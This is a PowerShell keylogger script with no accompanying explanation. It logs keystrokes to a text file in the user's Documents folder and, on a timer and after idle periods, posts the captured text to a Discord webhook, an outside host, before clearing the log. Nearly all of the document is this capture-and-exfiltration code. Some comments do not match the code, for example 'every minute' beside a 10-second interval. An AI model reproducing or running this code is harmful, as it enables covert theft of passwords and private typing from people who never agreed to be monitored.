# Define the log file path
$logFilePath = "$env:USERPROFILE\Documents\keylog.txt"

# Initialize the last keystroke time
$lastKeystrokeTime = [System.DateTime]::Now

# Function to upload data to Discord
function Upload-Discord {
    param (
        [string]$text
    )

    $hookurl = "$dc"
    $Body = @{
        'keylog' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }
}

# Check if the log file exists, and if not, create it
if (-not (Test-Path -Path $logFilePath)) {
    try {
        $null | Out-File -FilePath $logFilePath
    } catch {
        Write-Host "Error creating log file: $_"
    }
}

# Initialize the keylog buffer
$keylog = ""

# Create a timer to upload keylog to Discord every minute
$timer = New-Object System.Timers.Timer
$timer.Interval = 10000  # 10000 ms = 10 seconds

# Define the timer action
$timerAction = {
    $text = Get-Content -Path $logFilePath
    if (-not [string]::IsNullOrEmpty($text)) {
        Upload-Discord -text $text
    }
}

# Register the timer event
Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action $timerAction

# Start the timer
$timer.Start()

# Start monitoring keystrokes
Write-Host "Monitoring keystrokes. Press Ctrl+Alt+0 to stop."
while ($true) {
    # Check if a key is available
    if ([System.Console]::KeyAvailable) {
        $keyInfo = [System.Console]::ReadKey()
        $key = $keyInfo.KeyChar

        # Log the key
        Add-Content -Path $logFilePath -Value $key
        $lastKeystrokeTime = [System.DateTime]::Now
    }

    # Check if the keylog should be uploaded
    $elapsedTime = [System.DateTime]::Now - $lastKeystrokeTime
    if ($elapsedTime.TotalSeconds -ge 60) {
        $text = Get-Content -Path $logFilePath
        Upload-Discord -text $text
        Clear-Content -Path $logFilePath
    }

    # Check if Ctrl+Alt+0 is pressed to stop the script
    if ([System.Console]::KeyAvailable) {
        $keyInfo = [System.Console]::ReadKey()
        if (($keyInfo.Modifiers -eq [System.ConsoleModifiers]::Control -and $keyInfo.Key -eq "D0") -and ([System.Console]::KeyAvailable)) {
            $keyInfo = [System.Console]::ReadKey()
            if ($keyInfo.Modifiers -eq [System.ConsoleModifiers]::Alt -and $keyInfo.Key -eq "D0") {
                # Stop the script and unregister events
                $timer.Stop()
                Unregister-Event -SourceIdentifier "Elapsed"
                break
            }
        }
    }
}
